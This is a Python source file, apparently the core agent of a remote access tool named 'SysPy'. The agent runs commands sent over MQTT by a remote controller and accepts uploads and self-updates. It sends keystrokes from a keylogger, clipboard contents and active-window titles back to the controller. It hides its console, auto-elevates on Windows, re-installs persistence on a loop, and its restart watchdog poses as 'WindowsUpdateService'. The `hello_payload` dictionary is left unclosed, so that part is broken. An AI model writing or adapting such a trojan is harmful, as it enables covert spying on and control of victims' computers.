"""Agent lifecycle and transport loop."""

from __future__ import annotations

import hashlib
import os
import socket
import subprocess
import sys
import threading
import time
import traceback
from typing import Any

from .. import __version__, config, crypto, protocol
from ..mqtt import MqttClient, random_client_id
from . import commands, persistence, runtime, stealth, sysinfo, updater, lan
from ..guardian import install as guardian_install, ensure_startup_approved as guardian_ensure_startup
from .inputs import Keylogger


class Agent:
    """The running agent.

    Owns the transport, the command dispatcher and the background workers.
    """

    def __init__(self) -> None:
        self.key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
        self.codec = protocol.Codec(self.key)
        self.reassembler = protocol.Reassembler()

        self.agent_id = config.agent_id()
        self.hostname = socket.gethostname()
        self.cwd = os.path.expanduser("~")
        self.processes: set[Any] = set()
        self.keylogger = Keylogger()

        self.bundle_entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))
        self.self_sha = self._sha_of(self.bundle_entry)

        self.eval_namespace: dict[str, Any] = {
            "agent": self, "os": os, "sys": sys, "time": time,
            "config": config, "sysinfo": sysinfo,
        }

        self._client: MqttClient | None = None
        self._connected = threading.Event()
        self._last_persistence_check = 0.0
        self._running = True

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _sha_of(path: str) -> str:
        try:
            with open(path, "rb") as handle:
                return hashlib.sha256(handle.read()).hexdigest()[:12]
        except OSError:
            return "unknown"

    def reply(self, text: str) -> None:
        """Send a line of output to the controller."""
        self.send({"t": "out", "d": text})

    def send_json(self, payload: dict[str, Any]) -> None:
        """Send structured data (file listings, process tables, ...)."""
        self.send({"t": "json", **payload})

    def send_file(self, name: str, data: bytes) -> None:
        """Send a binary payload in chunks."""
        transfer = os.urandom(4).hex()
        for part in protocol.chunk(data, transfer):
            self.send({"t": "file", "name": name, **part})
            time.sleep(0.01)

    def send(self, message: dict[str, Any]) -> None:
        """Seal and publish a message."""
        if not self._client or not self._client.alive:
            return
        try:
            self._client.publish(
                config.topic_up(self.agent_id),
                self.codec.encode(message),
                qos=0 if message.get("t") == "evt" else 1,
            )
        except Exception:
            pass

    def hello_payload(self) -> dict[str, Any]:
        """The identity document sent on connect and on every heartbeat."""
        return {
            "t": "hello",
            "id": self.agent_id,
            "name": self.hostname,
            "ver": __version__,
            "sha": self.self_sha,
            "path": self.bundle_entry,
            "pid": os.getpid(),
            "info": sysinfo.summary(),
            "admin": stealth.is_admin(),
            "persistence": persistence.status(),
            "lan": {
                "parent": config.parent_id(),
                "hop": config.hop(),
                "group": config.group(),
                "mac": config.agent_id().split('-')[-1],
                "subnet": config.parent_ip(),
                "enabled": config.LAN_ENABLED,
                "port": config.LAN_PORT,
                "http_port": config.LAN_HTTP_PORT,
            },

    # ------------------------------------------------------------------
    # Inbound
    # ------------------------------------------------------------------

    def _on_message(self, topic: str, payload: bytes) -> None:
        try:
            message = self.codec.decode(payload)
        except Exception:
            return

        kind = message.get("t")
        if kind == "cmd":
            threading.Thread(target=commands.execute, args=(self, message.get("d", "")),
                             name="cmd", daemon=True).start()
        elif kind == "put":
            self._receive_upload(message)
        elif kind == "update":
            self._receive_update(message)

    def _receive_upload(self, message: dict[str, Any]) -> None:
        from . import files
        data = self.reassembler.feed(message, time.time())
        if data is None:
            received, total = self.reassembler.progress(message)
            if total > 3 and received % 5 == 0:
                self.send({"t": "progress", "d": f"upload {received}/{total}"})
            return
        try:
            destination = files.save_upload(message.get("dest", "."),
                                            message.get("name", "file.bin"), data)
            self.reply(f"saved {len(data)} bytes -> {destination}")
            self.send_json({"kind": "fs_op_result", "op": "upload", "success": True, "path": destination})
        except Exception as err:
            self.reply(f"upload failed: {err}")
            self.send_json({"kind": "fs_op_result", "op": "upload", "success": False, "error": str(err)})

    def _receive_update(self, message: dict[str, Any]) -> None:
        if int(message.get("proto", 0)) > 1:
            self.reply("update rejected: controller protocol newer than agent")
            return
        data = self.reassembler.feed(message, time.time())
        if data is None:
            received, total = self.reassembler.progress(message)
            if total > 3 and received % 5 == 0:
                self.send({"t": "progress", "d": f"update {received}/{total}"})
            return
        ok, detail = updater.apply(data, message.get("sha", ""))
        self.reply(f"update {'applied ' + detail if ok else 'failed: ' + detail}")

    # ------------------------------------------------------------------
    # Background workers
    # ------------------------------------------------------------------

    def _heartbeat(self) -> None:
        while self._running:
            time.sleep(config.HEARTBEAT_INTERVAL)
            if self._connected.is_set():
                self.send(self.hello_payload())

    def _telemetry(self) -> None:
        last_clipboard = ""
        while self._running:
            time.sleep(config.TELEMETRY_INTERVAL)
            if not self._connected.is_set():
                continue
            try:
                if self.keylogger.active:
                    chunk = self.keylogger.take()
                    if chunk:
                        self.send({"t": "keys", "d": chunk})

                from .inputs import clipboard_get
                clipboard = ""
                current = clipboard_get()
                if current != last_clipboard:
                    last_clipboard = current
                    clipboard = current[:120]

                self.send({
                    "t": "evt",
                    "k": "stat",
                    "cpu": sysinfo.cpu_percent(),
                    "ram": sysinfo.memory_percent(),
                    "battery": sysinfo.battery(),
                    "idle": sysinfo.idle_seconds(),
                    "window": sysinfo.active_window(),
                    "processes": sysinfo.process_count(),
                    "uptime": sysinfo.uptime(),
                    "clipboard": clipboard,
                })
            except Exception:
                pass

    def _housekeeping(self) -> None:
        """Re-assert persistence and heal missing copies."""
        while self._running:
            time.sleep(30)
            try:
                now = time.time()
                if now - self._last_persistence_check > 180:
                    self._last_persistence_check = now
                    actions = persistence.ensure()
                    if actions:
                        self.send({"t": "note", "d": "persistence: " + ", ".join(actions)})
            except Exception:
                pass

    def _spawn_watchdog(self) -> None:
        """Start the supervisor twin if one is not already running."""
        if os.environ.get("SYSPY_NO_WATCHDOG"):
            return

        lock = stealth.watchdog_lock_path()
        owner = stealth.read_pid(lock)
        if owner and owner != os.getpid() and stealth.process_alive(owner):
            return

        command = [sys.executable, self.bundle_entry, "--watchdog"]
        if os.name == "nt":
            python = runtime.interpreter()
            if python.lower().endswith("python.exe"):
                windowless = python[: -len("python.exe")] + "pythonw.exe"
                if os.path.exists(windowless):
                    python = windowless
            command = [python, self.bundle_entry, "--watchdog"]

        try:
            subprocess.Popen(command, close_fds=True,
                             creationflags=0x00000200 if os.name == "nt" else 0)
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Transport
    # ------------------------------------------------------------------

    def _connect(self) -> bool:
        for host, port, use_tls in config.broker_order():
            try:
                client = MqttClient(random_client_id("syspy-a"), self._on_message)
                client.connect(host, port, use_tls)
                client.subscribe(config.topic_down(self.agent_id), qos=1)
                self._client = client
                self._connected.set()
                self.send({"t": "note", "d": f"connected via {host}:{port}"})
                return True
            except Exception:
                continue
        return False

    def run(self) -> None:
        """Main loop.  Never returns unless the process is killed."""
        updater.write_boot_marker()

        for worker in (self._heartbeat, self._telemetry, self._housekeeping):
            threading.Thread(target=worker, name=worker.__name__, daemon=True).start()
        self._spawn_watchdog()

        def greet() -> None:
            while self._running:
                time.sleep(2)
                if self._connected.is_set():
                    self.send(self.hello_payload())
                    return
        threading.Thread(target=greet, name="greet", daemon=True).start()

        while self._running:
            if not self._connect():
                time.sleep(config.MQTT_RECONNECT_DELAY)
                continue
            client = self._client
            while client and client.alive:
                time.sleep(1)
            self._connected.clear()
            if client:
                client.disconnect()
            time.sleep(config.MQTT_RECONNECT_DELAY)

    def stop(self) -> None:
        self._running = False


def main(argv: list[str] | None = None) -> int:
    """Entry point for ``agent.py``."""
    argv = list(sys.argv[1:] if argv is None else argv)

    if "--watchdog" in argv:
        return _watchdog_main()

    takeover = 0
    if "--takeover" in argv:
        try:
            takeover = int(argv[argv.index("--takeover") + 1])
        except (ValueError, IndexError):
            takeover = 0

    entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))

    if "--check" in argv:
        print(f"version : {__version__}")
        print(f"entry   : {entry}")
        print(f"root    : {stealth.bundle_root()}")
        print(f"admin   : {stealth.is_admin()}")
        for directory in stealth.install_directories():
            candidate = os.path.join(directory, stealth.executable_name())
            print(f"{'OK  ' if os.path.exists(candidate) else 'MISS'} {candidate}")
        return 0

    if "--uninstall" in argv or "--remove" in argv:
        if stealth.IS_WINDOWS and not stealth.is_admin() and "--no-elevate" not in argv:
            print("[*] Requesting Administrator privileges to stop services and remove files...")
            if stealth.elevate_process(argv, wait=True):
                print("[+] Uninstallation completed successfully.")
                return 0
            print("[!] Elevation was declined or failed. Proceeding with user-level removal.")
        print("Removing SysPy agent and persistence...")
        for action in persistence.remove():
            print(f"  [x] {action}")
        print("Done.")
        return 0

    if "--install" in argv:
        print("\n".join(persistence.install()))
        return 0

    # Auto-elevate to Administrator on Windows if running unprivileged
    if stealth.IS_WINDOWS and not stealth.is_admin() and "--no-elevate" not in argv:
        if stealth.elevate_process(argv):
            return 0

    if stealth.acquire_single_instance(takeover):
        return 0

    stealth.set_console_title(f"{config.PRODUCT_DESCRIPTION} ({config.PRODUCT_NAME})")
    stealth.disable_quick_edit()
    if "--visible" not in argv and "--debug" not in argv:
        stealth.hide_console()

    runtime.ensure()
    persistence.install()
    persistence.install_copies()

    agent = Agent()
    try:
        agent.run()
    except KeyboardInterrupt:
        pass
    except Exception:
        traceback.print_exc()
        time.sleep(5)
    finally:
        stealth.release_single_instance()
    return 0


def _watchdog_main() -> int:
    """Tiny supervisor: restart the agent if it dies.

    The watchdog owns its *own* lock file holding its *own* pid, so a restarted
    agent can tell a live supervisor from a stale one.
    """
    lock = stealth.watchdog_lock_path()
    owner = stealth.read_pid(lock)
    if owner and owner != os.getpid() and stealth.process_alive(owner):
        return 0

    stealth.write_pid(lock, os.getpid())
    stealth.set_console_title("WindowsUpdateService (watchdog)")
    stealth.hide_console()

    entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))

    while True:
        time.sleep(5)
        stealth.write_pid(lock, os.getpid())
        owner = stealth.read_pid(stealth.lock_path())
        if owner and stealth.process_alive(owner):
            continue
        try:
            command = [entry] if entry.lower().endswith(".exe") else [runtime.interpreter(), entry]
            subprocess.Popen(command + ["--hidden"], close_fds=True,
                             creationflags=0x00000200 if os.name == "nt" else 0)
        except OSError:
            pass
        time.sleep(10)
